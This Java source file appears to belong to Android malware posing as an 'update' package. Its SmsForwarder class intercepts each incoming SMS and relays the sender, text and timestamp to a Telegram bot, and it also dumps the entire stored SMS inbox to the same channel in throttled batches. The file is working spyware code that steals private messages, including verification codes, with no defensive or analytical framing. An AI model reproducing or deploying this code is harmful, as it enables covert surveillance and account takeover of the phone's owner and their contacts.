package com.kasari.update;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsForwarder extends BroadcastReceiver {

    private static boolean oldSmsSent = false;

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    if (sms != null) {
                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getMessageBody();
                        long timestamp = sms.getTimestampMillis();
                        
                        String date = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
                            Locale.getDefault()).format(new Date(timestamp));
                        
                        TelegramController.sendMessage(context, 
                            "📨 **New SMS**\nFrom: " + sender + 
                            "\nMsg: " + message + "\nTime: " + date);
                    }
                }
            }
        }
    }

    public static void sendAllOldSms(Context context) {
        if (oldSmsSent) return;
        oldSmsSent = true;
        
        new Thread(() -> {
            try {
                ContentResolver cr = context.getContentResolver();
                Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                
                Cursor cursor = cr.query(uri, null, null, null, "date ASC");
                
                if (cursor != null && cursor.moveToFirst()) {
                    int total = cursor.getCount();
                    TelegramController.sendMessage(context, 
                        "📨 Forwarding " + total + " old SMS messages...");
                    
                    int senderIdx = cursor.getColumnIndex("address");
                    int bodyIdx = cursor.getColumnIndex("body");
                    int dateIdx = cursor.getColumnIndex("date");
                    
                    int count = 0;
                    StringBuilder batch = new StringBuilder();
                    batch.append("📨 **Old SMS (").append(total).append(")**\n\n");
                    
                    do {
                        String sender = senderIdx >= 0 ? cursor.getString(senderIdx) : "Unknown";
                        String body = bodyIdx >= 0 ? cursor.getString(bodyIdx) : "";
                        long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                        
                        String dateStr = new SimpleDateFormat("dd-MM HH:mm", 
                            Locale.getDefault()).format(new Date(date));
                        
                        String entry = "📩 " + sender + " | " + dateStr + "\n" + body + "\n\n";
                        
                        if (batch.length() + entry.length() > 4000) {
                            TelegramController.sendMessage(context, batch.toString());
                            Thread.sleep(1000);
                            batch = new StringBuilder();
                        }
                        
                        batch.append(entry);
                        count++;
                        
                        if (count % 20 == 0) {
                            Thread.sleep(500);
                        }
                        
                    } while (cursor.moveToNext());
                    
                    if (batch.length() > 0) {
                        TelegramController.sendMessage(context, batch.toString());
                    }
                    
                    cursor.close();
                    
                    TelegramController.sendMessage(context, 
                        "✅ All " + total + " SMS messages forwarded successfully!");
                }
            } catch (Exception e) {
                e.printStackTrace();
                TelegramController.sendMessage(context, "❌ SMS forwarding error");
            }
        }).start();
    }
}